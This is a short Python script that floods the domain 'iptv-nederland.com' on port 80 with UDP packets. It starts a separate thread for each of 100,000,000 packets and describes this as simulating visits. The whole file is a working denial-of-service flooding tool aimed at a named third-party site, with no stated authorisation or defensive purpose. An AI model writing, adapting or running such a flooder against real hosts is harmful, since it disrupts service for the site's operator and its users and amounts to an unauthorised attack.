import socket
import threading

# Target IP address and port
target_ip = 'iptv-nederland.com'  # Replace with the actual IP address if needed
target_port = 80  # Replace with the correct UDP port

# Number of visits you want to simulate
number_of_visits = 100000000

# Define the message to send
message = b"Test message for UDP traffic"  # Replace with the actual data you want to send


def send_udp_packet(visit_number):
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Send the message
        sock.sendto(message, (target_ip, target_port))
        print(f"Packet {visit_number}: Sent")
        sock.close()
    except Exception as e:
        print(f"Packet {visit_number}: Failed with exception {e}")


def simulate_traffic():
    threads = []
    for i in range(number_of_visits):
        thread = threading.Thread(target=send_udp_packet, args=(i + 1,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    simulate_traffic()
